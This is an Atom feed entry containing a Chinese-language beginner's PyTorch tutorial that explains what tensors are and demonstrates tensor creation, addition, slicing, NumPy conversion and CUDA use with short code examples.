    <updated>2019-10-23T13:10:06.313Z</updated>
    
    <content type="html"><![CDATA[<p>学习使用前准备：</p><p><a href="http://pytorch.org" target="_blank" rel="noopener">安装pytorch</a></p><p><a href="https://zhuanlan.zhihu.com/p/56936691" target="_blank" rel="noopener">pytorch安装问题解决</a></p><p>目前我的pytorch仍然存在使用问题…</p><a id="more"></a><h2 id="1-tensor数学"><a href="#1-tensor数学" class="headerlink" title="1.tensor数学"></a>1.tensor数学</h2><p>要介绍Tensor这个数据类型，我觉得有必要扯一下数学。</p><p>我们都知道：</p><p>标量（Scalar）是只有大小，没有方向的量，如1，2，3等</p><p>向量（Vector）是有大小和方向的量，其实就是一串数字，如(1,2)</p><p>矩阵（Matrix）是好几个向量拍成一排合并而成的一堆数字，如[1,2;3,4]</p><p><img src="https://i.loli.net/2019/10/23/P9ob7ESkndh2CmZ.png" alt="如图，我们可以看出，矩阵是二维的，向量是一维的，标量是零维的。"></p><p>那么张量（Tensor）是什么呢？是按照三维排列的一堆数字？</p><p>是的。但是也不完全正确。</p><p>其实标量，向量，矩阵它们三个也是张量，标量是零维的张量，向量是一维的张量，矩阵是二维的张量。</p><p><img src="https://i.loli.net/2019/10/23/kLCAUNwI4jdViGb.png" alt="张量就是按照任意维排列的一堆数字的推广。如图所示，矩阵不过是三维张量下的一个二维切面。要找到三维张量下的一个标量，需要三个维度的坐标来定位。"></p><p>除此之外，张量还可以是四维的、五维的等等</p><p>数学扯完了，我们撸串代码操练操练。</p><h2 id="2-基础练习"><a href="#2-基础练习" class="headerlink" title="2.基础练习"></a>2.基础练习</h2><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> torch <span class="hljs-comment">#引用torch包</span></span><br><span class="line">x = torch.Tensor(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)  <span class="hljs-comment">#构造一个2x3的矩阵，没初始化但仍然会有值</span></span><br><span class="line">print(x)</span><br><span class="line"></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">8.0118e+28  4.5768e-41  8.0118e+28</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">4.5768e-41  2.9747e-37  1.4013e-45</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">[torch.FloatTensor of size 2x3]  #可以看出数据类型是浮点数的2x3矩阵</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br></pre></td></tr></table></figure><p>看矩阵看不出张量的道道，我们来点刺激的</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">y=torch.Tensor(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>) <span class="hljs-comment">#构造一个4x2x3的张量，没初始化</span></span><br><span class="line">print(y)</span><br><span class="line"></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">(0 ,.,.) =</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">1.00000e-29 *</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">0.0000  2.5244  0.0000</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">2.5244  0.0000  0.0000</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">(1 ,.,.) =</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">1.00000e-29 *</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">0.0000  0.0000  0.0000</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">0.0000  0.0000  0.0000</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">(2 ,.,.) =</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">1.00000e-29 *</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">0.0000  0.0000  0.0000</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">0.0000  0.0000  0.0000</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">(3 ,.,.) =</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">1.00000e-29 *</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">0.0000  0.0000  0.0000</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">2.5244  0.0000  2.5244</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">[torch.FloatTensor of size 4x2x3]</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br></pre></td></tr></table></figure><p>我们从上面的返回值可以看出，4x2x3的张量y由4个2x3的矩阵构成，这符合了我们数学上的定义。</p><h2 id="3-Tensor的加法-四种"><a href="#3-Tensor的加法-四种" class="headerlink" title="3.Tensor的加法(四种)"></a>3.Tensor的加法(四种)</h2><p>我们先初始化两个张量：</p><p><img src="https://i.loli.net/2019/10/23/aKb2mHCZu3VgITl.png" alt></p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">第一种：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;a+b</span><br><span class="line"></span><br><span class="line">第二种：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;torch.add(a,b)</span><br><span class="line"></span><br><span class="line">第三种：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;result = torch.Tensor(<span class="hljs-number">5</span>,<span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;torch.add(a,b,out=result) <span class="hljs-comment">#把运算结果存储在result上</span></span><br><span class="line"></span><br><span class="line">第四种：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;b.add_(a) <span class="hljs-comment">#把运算结果覆盖掉b</span></span><br></pre></td></tr></table></figure><h2 id="4-Tensor的部分截取"><a href="#4-Tensor的部分截取" class="headerlink" title="4.Tensor的部分截取"></a>4.Tensor的部分截取</h2><p><img src="https://i.loli.net/2019/10/23/5f3mkoFLcSiWOgt.png" alt></p><h2 id="5-Tensor的其他操作"><a href="#5-Tensor的其他操作" class="headerlink" title="5.Tensor的其他操作"></a>5.Tensor的其他操作</h2><p>除了加法以外，还有上百种张量的操作，比如说转置（transposing），切片（slicing）等，送个<a href="https://pytorch.org/docs/stable/torch.html" target="_blank" rel="noopener">链接</a> 给少侠，少侠自己在家慢慢操练了🏇。</p><h2 id="6-Tensor与numpy的Array的相互转换"><a href="#6-Tensor与numpy的Array的相互转换" class="headerlink" title="6.Tensor与numpy的Array的相互转换"></a>6.Tensor与numpy的Array的相互转换</h2><p>torch的tensor可以与numpy的array进行转换</p><h3 id="（1）tensor⇒array"><a href="#（1）tensor⇒array" class="headerlink" title="（1）tensor⇒array"></a>（1）tensor⇒array</h3><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;b = a.numpy() <span class="hljs-comment">#a为tensor</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/23/RAFfxeu1wGcoMNP.png" alt></p><h3 id="（2）array⇒tensor"><a href="#（2）array⇒tensor" class="headerlink" title="（2）array⇒tensor"></a>（2）array⇒tensor</h3><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;b = torch.from_numpy(a)  <span class="hljs-comment">#a为numpy的array</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/23/GV7ltc4BhqrvyxW.png" alt></p><h2 id="7-CUDA"><a href="#7-CUDA" class="headerlink" title="7.CUDA"></a>7.CUDA</h2><p>假如少侠你有一块nvidia的显卡并支持cuda（如GTX 1080），那么恭喜你，你可以使用显卡gpu进行tensor的运算。假如你我一样没有，考虑买一个吧</p><p>购买指南：<a href="http://www.sohu.com/a/106650024_157627" target="_blank" rel="noopener">为你的深度学习任务挑选最合适GPU:从性能到价格的全方位指南</a></p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;torch.cuda.is_available()  <span class="hljs-comment">#看看是否支持cuda</span></span><br></pre></td></tr></table></figure><p>假如返回的是True那么，下面的代码将带你飞。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;x = x.cuda()</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;y = y.cuda()</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;x+y           <span class="hljs-comment">#这里的x和y都是tensor，使用cuda函数以后，x和y的所有运算均会调用gpu来运算。</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习使用前准备：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://pytorch.org&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安装pytorch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/56936691&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pytorch安装问题解决&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目前我的pytorch仍然存在使用问题…&lt;/p&gt;
    
    </summary>
    
    
      <category term="AI" scheme="http://yoursite.com/categories/AI/"/>
    
    
      <category term="pytorch张量" scheme="http://yoursite.com/tags/pytorch%E5%BC%A0%E9%87%8F/"/>
    
  </entry>
  
</feed>
